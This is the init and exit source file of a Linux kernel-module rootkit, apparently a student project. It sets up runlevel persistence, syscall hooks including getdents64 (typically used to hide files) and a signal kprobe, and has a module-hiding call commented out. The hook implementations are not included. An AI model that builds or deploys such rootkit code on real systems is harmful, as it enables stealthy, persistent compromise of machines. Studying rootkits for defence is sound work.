#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HOOOKING");
MODULE_AUTHOR("2600 student");
MODULE_VERSION("0.0.1");

static int __init rootkit_init(void) {

  int ret;

  printk(KERN_INFO "rootkit: init\n");
  
  persistence_runlevels();
  rootkit_init_hook();
  rootkit_init_hook_getdents64();
  //hide_from_lsmod();
  //kprobes_init();

  /* plante quand on essaie d'afficher le contenu de regs->di
  int ret = register_kretprobe(&rootkit_kretprobe);
  if (ret < 0) {
    printk(KERN_INFO "Error registering kretprobe: %d\n", ret);
    return -1;
  }
  printk(KERN_INFO "Planted return probe at %s: %p\n",
  rootkit_kretprobe.kp.symbol_name, rootkit_kretprobe.kp.addr);
  */

  ret = register_kprobe(&sig_kp);
  if (ret < 0) {
    printk(KERN_INFO "Error registering signal kprobe: %d\n", ret);
    return -1;
  }
  printk(KERN_INFO "Kprobe pour signaux inséré à %s: %p\n", sig_kp.symbol_name, sig_kp.addr);

  return 0;
}

static void __exit rootkit_exit(void) {
  printk(KERN_INFO "rootkit: exit\n");
  unregister_kprobe(&sig_kp);
  printk(KERN_INFO "kprobe %p retiré\n", sig_kp.addr);


  rootkit_exit_hook();
  rootkit_exit_hook_getdents64();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
